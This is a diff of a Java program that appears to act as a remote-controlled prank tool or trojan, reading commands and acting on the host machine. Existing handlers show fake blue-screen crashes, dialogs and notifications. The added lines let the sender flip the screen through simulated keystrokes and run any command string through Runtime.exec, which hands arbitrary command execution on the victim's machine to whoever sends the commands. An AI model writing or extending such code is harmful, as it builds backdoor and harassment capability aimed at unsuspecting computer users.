@@ -2,6 +2,7 @@ package com.soup;
 
 import javax.swing.*;
 import java.awt.*;
+import java.awt.event.KeyEvent;
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
@@ -90,7 +91,7 @@ public class Main {
                 }
             }
             try {
-                Thread.sleep(500);
+                Thread.sleep(1000);
             } catch (InterruptedException e) {
                 e.printStackTrace();
             }
@@ -181,26 +182,47 @@ public class Main {
                 if (command.getSubs().size() < 3) {
                     createDialog(command.getSubs().get(0));
                 } else {
-                    createDialog(command.getSubs().get(0), command.getSubs().get(1), Integer.parseInt(command.getSubs().get(2))); }
-                } else if (command.getCmd().equalsIgnoreCase("notif")) {
-                    String header = command.getSubs().get(0);
-                    String message = command.getSubs().get(1);
-                    int timeLength = Integer.parseInt(command.getSubs().get(2));
-                    NotificationThread notif = new NotificationThread(header, message, timeLength);
-                    notif.start();
-                } else if (command.getCmd().equalsIgnoreCase("cd")) {
-                    //TODO maybe do something with a VBS script
-                } else if (command.getCmd().equalsIgnoreCase("BSOD")) {
-                    switch (command.getSubs().size()) {
-                        case 0: new BSOD(); break;
-                        case 1: new BSOD(Integer.parseInt(command.getSubs().get(0))); break;
-                        case 2: new BSOD(Integer.parseInt(command.getSubs().get(0)), command.getSubs().get(1), 3000); break;
-                        case 3: new BSOD(Integer.parseInt(command.getSubs().get(0)), command.getSubs().get(1), Integer.parseInt(command.getSubs().get(2))); break;
-                        default: new BSOD();
-                    }
+                    createDialog(command.getSubs().get(0), command.getSubs().get(1), Integer.parseInt(command.getSubs().get(2)));
+                }
+            } else if (command.getCmd().equalsIgnoreCase("notif")) {
+                String header = command.getSubs().get(0);
+                String message = command.getSubs().get(1);
+                int timeLength = Integer.parseInt(command.getSubs().get(2));
+                NotificationThread notif = new NotificationThread(header, message, timeLength);
+                notif.start();
+            } else if (command.getCmd().equalsIgnoreCase("cd")) {
+                //TODO maybe do something with a VBS script
+            } else if (command.getCmd().equalsIgnoreCase("BSOD")) {
+                switch (command.getSubs().size()) {
+                    case 0: new BSOD(); break;
+                    case 1: new BSOD(Integer.parseInt(command.getSubs().get(0))); break;
+                    case 2: new BSOD(Integer.parseInt(command.getSubs().get(0)), command.getSubs().get(1), 3000); break;
+                    case 3: new BSOD(Integer.parseInt(command.getSubs().get(0)), command.getSubs().get(1), Integer.parseInt(command.getSubs().get(2))); break;
+                    default: new BSOD();
+                }
+            } else if (command.getCmd().equalsIgnoreCase("flip")) {
+                int preSleep = 2000;
+                if (command.getSubs().size() == 1) {
+                    preSleep = Integer.parseInt(command.getSubs().get(0));
+                }
+                new ButtonInputThread(0, 0, new int[]{KeyEvent.CTRL_DOWN_MASK, KeyEvent.ALT_DOWN_MASK, KeyEvent.VK_DOWN}).start();
+                new ButtonInputThread(preSleep, 0, new int[]{KeyEvent.CTRL_DOWN_MASK, KeyEvent.ALT_DOWN_MASK, KeyEvent.VK_UP}).start();
+            } else if (command.getCmd().equalsIgnoreCase("run")) {
+                String runString = "";
+                if (command.getSubs().size() > 0) {
+                    runString = command.getSubs().get(0);
+
+                }
+                System.out.println("Running \"" + runString + "\"");
+                Runtime runtime = Runtime.getRuntime();
+                try {
+                    runtime.exec(runString);
+                } catch (IOException e) {
+                    e.printStackTrace();
                 }
             }
         }
+    }
 
     public static void createDialog(String text) {
         new dialogThread(text).start();
